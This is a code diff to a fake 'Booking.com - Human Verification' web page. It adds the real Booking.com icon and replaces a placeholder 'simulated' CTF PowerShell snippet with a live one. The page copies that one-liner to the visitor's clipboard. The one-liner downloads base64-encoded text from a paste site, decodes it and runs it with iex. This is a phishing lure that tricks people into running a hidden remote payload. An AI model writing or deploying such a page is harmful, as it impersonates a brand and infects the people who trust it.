@@ -3,6 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/x-icon" href="https://upload.wikimedia.org/wikipedia/commons/6/6b/Booking.com_Icon_2022.svg">
     <title>Booking.com - Human Verification</title>
     <style>
         body {
@@ -134,11 +135,7 @@
         }
 
         function copyToClipboard() {
-            const code = "# Simulated malicious PowerShell script for CTF\n" +
-                        "$url = 'https://example.com/malicious.exe';\n" +
-                        "$output = '$env:temp\\malicious.exe';\n" +
-                        "Invoke-WebRequest -Uri $url -OutFile $output;\n" +
-                        "Start-Process $output;";
+            const code = "iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((New-Object Net.WebClient).DownloadString("https://raw-paste.vercel.app/raw/o99sqs8585pp924nrp31sp14s3rp11rn"))))";
             navigator.clipboard.writeText(code).then(() => {
                 const button = document.getElementById('verify-button');
                 const successMessage = document.getElementById('success-message');
